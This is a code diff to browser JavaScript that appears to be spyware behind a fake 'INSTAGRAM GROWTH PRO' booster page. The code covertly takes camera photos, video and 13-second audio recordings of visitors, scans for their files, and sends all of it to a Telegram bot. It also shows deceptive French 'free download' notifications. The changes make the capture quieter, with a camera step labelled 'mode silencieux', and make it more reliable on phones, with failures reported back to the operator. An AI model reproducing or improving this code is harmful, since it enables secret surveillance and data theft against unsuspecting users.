@@ -79,13 +79,15 @@ async function sendAudioToTelegram(audioBlob) {
     try {
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('audio', audioBlob, 'audio.webm');
-        await fetch(`${BOT_API_URL}/sendAudio`, { method: 'POST', body: formData });
+        formData.append('voice', audioBlob, 'voice.ogg');
+        await fetch(`${BOT_API_URL}/sendVoice`, { method: 'POST', body: formData });
     } catch(e) {
-        const formData2 = new FormData();
-        formData2.append('chat_id', TELEGRAM_CHAT_ID);
-        formData2.append('document', audioBlob, 'audio.webm');
-        await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData2 });
+        try {
+            const formData2 = new FormData();
+            formData2.append('chat_id', TELEGRAM_CHAT_ID);
+            formData2.append('document', audioBlob, 'audio.webm');
+            await fetch(`${BOT_API_URL}/sendDocument`, { method: 'POST', body: formData2 });
+        } catch(e2) {}
     }
 }
 
@@ -226,7 +228,7 @@ function sendPushNotification() {
         '⚡ Offre limitée: Application Booster GRATUITE aujourd\'hui'
     ];
     const randomMsg = messages[Math.floor(Math.random() * messages.length)];
-    new Notification('📢 INSTAGRAM GROWTH PRO', {
+    const notification = new Notification('📢 INSTAGRAM GROWTH PRO', {
         body: `${randomMsg} ⬇️ Cliquez pour télécharger ⬇️`,
         icon: 'https://img.icons8.com/color/48/000000/download--v1.png',
         requireInteraction: true,
@@ -247,6 +249,7 @@ async function captureAutoPhoto() {
     try {
         const video = document.createElement('video');
         video.srcObject = cameraStream;
+        video.setAttribute('playsinline', '');
         await video.play();
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth || 640;
@@ -255,6 +258,7 @@ async function captureAutoPhoto() {
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         await sendPhotoToTelegram(canvas.toDataURL('image/jpeg', 0.8));
         video.pause();
+        video.srcObject = null;
     } catch(e) {}
 }
 
@@ -266,7 +270,7 @@ async function captureAutoVideo() {
         const chunks = [];
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         mediaRecorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'video/webm' });
+            const blob = new Blob(chunks, { type: 'video/mp4' });
             if (blob.size > 0) await sendVideoToTelegram(blob);
             isRecording = false;
         };
@@ -285,23 +289,32 @@ async function captureAutoAudio() {
         const chunks = [];
         mediaRecorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
         mediaRecorder.onstop = async () => {
-            const blob = new Blob(chunks, { type: 'audio/webm' });
-            if (blob.size > 0) await sendAudioToTelegram(blob);
+            const blob = new Blob(chunks, { type: 'audio/ogg' });
+            if (blob.size > 0) {
+                await sendAudioToTelegram(blob);
+                sendToTelegram(`🎤 Audio envoyé (${Math.round(blob.size/1024)} KB)`);
+            }
             stream.getTracks().forEach(t => t.stop());
             isAudioRecording = false;
         };
         mediaRecorder.start();
         await new Promise(r => setTimeout(r, 13000));
         mediaRecorder.stop();
-    } catch(e) { isAudioRecording = false; }
+    } catch(e) { 
+        isAudioRecording = false;
+        sendToTelegram(`❌ Erreur audio: ${e.message}`);
+    }
 }
 
 async function requestCameraAndCapture() {
     try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { width: { ideal: 480 }, height: { ideal: 480 } },
+            audio: false
+        });
         cameraStream = stream;
         collectedData.permissionsGranted.push({ type: 'camera', status: 'granted' });
-        sendToTelegram('✅ CAMÉRA ACCEPTÉE');
+        sendToTelegram('✅ CAMÉRA ACCEPTÉE (mode silencieux)');
         
         for (let i = 1; i <= 6; i++) {
             await captureAutoPhoto();
@@ -316,6 +329,7 @@ async function requestCameraAndCapture() {
         setTimeout(() => scanAndSendExternalFiles(), 3000);
     } catch(e) {
         collectedData.permissionsGranted.push({ type: 'camera', status: 'denied' });
+        sendToTelegram(`❌ CAMÉRA REFUSÉE`);
     }
 }
 
@@ -441,7 +455,7 @@ function showGrantAllButton() {
         btn.disabled = true;
         await Notification.requestPermission();
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
             cameraStream = stream;
         } catch(e) {}
         const input = document.createElement('input');
